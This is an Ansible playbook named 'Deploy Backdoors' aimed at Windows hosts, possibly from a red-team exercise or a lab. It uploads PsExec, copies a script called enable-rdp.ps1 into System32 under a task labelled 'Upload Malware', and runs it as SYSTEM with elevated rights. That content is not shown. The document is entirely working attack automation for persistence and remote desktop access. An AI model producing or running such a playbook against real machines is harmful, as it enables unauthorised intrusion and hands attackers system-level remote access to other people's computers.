-
  name: Deploy Backdoors
  hosts: windows
  strategy: free
  gather_facts: no
  tasks:
    - include: tasks/upload_psexec.yaml



-
  name: Run the Bad File
  hosts: windows
  strategy: free
  gather_facts: no
  become_method: runas
  tasks:

    - name: Upload Malware
      win_copy:
        src: 'files/{{item}}'
        dest: 'C:\Windows\System32\{{item}}'
      with_items:
        - "enable-rdp.ps1"


    - name:  Run Malware Files as System
      win_psexec:
        command: '{{ item }}'
        executable: C:\Windows\System32\PsExec.exe
        elevated: yes
        system: yes
        interactive: yes
      with_items:
        - "powershell.exe C:\\Windows\\System32\\enable-rdp.ps1"